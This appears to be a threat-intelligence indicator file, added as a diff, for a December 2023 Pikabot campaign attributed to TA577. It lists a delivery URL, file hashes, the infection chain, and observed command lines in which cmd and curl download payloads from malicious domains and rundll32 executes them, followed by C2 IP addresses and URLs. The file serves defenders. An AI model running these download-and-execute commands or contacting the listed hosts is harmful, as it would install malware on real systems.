@@ -1,0 +1,79 @@
+14.12.2023 | Pikabot | TA577 | 1.1.17-ghost
+
+*************************************************
+
+.url https://shoepalacebd.com/ui/
+.zip 07dd5c7928a7716f1b12344b6b368bc239df382972a4e817cc691101fc742f1b
+.dll 30a563e0cb369e803bdd15116ae2d2c42ab5952c105d9c67304a94aeb0ddfd13
+
+*************************************************
+
+url > zip > js > curl > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Notesqf.js
+
+cmd.exe /c mkdir  C:\Fekforikbsd\Nirgkdhlhjtdjlt & curl https://hukerpinta.com/WuN/0.523930822231939.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+curl https://hukerpinta.com/WuN/0.523930822231939.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+cmd.exe /c mkdir  C:\Fekforikbsd\Nirgkdhlhjtdjlt & curl https://brouweres.com/VvS49/0.12729042523586897.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+curl https://brouweres.com/VvS49/0.12729042523586897.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+cmd.exe /c mkdir  C:\Fekforikbsd\Nirgkdhlhjtdjlt & curl https://egnersi.com/8papP/0.6929732932403683.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+curl https://egnersi.com/8papP/0.6929732932403683.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+cmd.exe /c mkdir  C:\Fekforikbsd\Nirgkdhlhjtdjlt & curl 0.5662635248636854.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+curl 0.5662635248636854.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+cmd.exe /c mkdir  C:\Fekforikbsd\Nirgkdhlhjtdjlt & curl 0.8775784901713727.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+curl  0.8775784901713727.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+cmd.exe /c mkdir  C:\Fekforikbsd\Nirgkdhlhjtdjlt & curl 0.3537472898094756.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+curl 0.3537472898094756.dat --output C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX
+
+cmd.exe /c timeout 10 & rundll32 C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX,Enter
+
+timeout  10 
+
+rundll32  C:\Fekforikbsd\Nirgkdhlhjtdjlt\Pjfjiejgjsjse.OOCCXX,Enter
+
+SearchProtocolHost.exe
+
+*************************************************
+
+https://hukerpinta.com/WuN/0.34937124772636113.dat
+https://brouweres.com/VvS49/0.1038985448688931.dat
+https://egnersi.com/8papP/0.6922216472156167.dat (Domain Status  Never Registered Before)
+
+*************************************************
+
+c2's
+
+172.232.175.59:5938
+172.232.173.219:5938
+57.128.108.132:13785
+172.232.162.198:13721
+172.232.164.159:5632
+172.232.186.251:5632
+57.128.83.129:2078
+51.83.253.102:9785
+57.128.164.11:5242
+172.232.175.59:5938
+
+https://172.232.175.59:5938/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://172.232.173.219:5938/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://57.128.108.132:13785/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://172.232.162.198:13721/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://172.232.164.159:5632/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://172.232.186.251:5632/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://57.128.83.129:2078/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://51.83.253.102:9785/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://57.128.164.11:5242/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+https://172.232.175.59:5938/spleuchan/48GpJ9LiTcaZZIk4b?fofarraw=tZsoBQGtLVHk4b6
+
+*************************************************
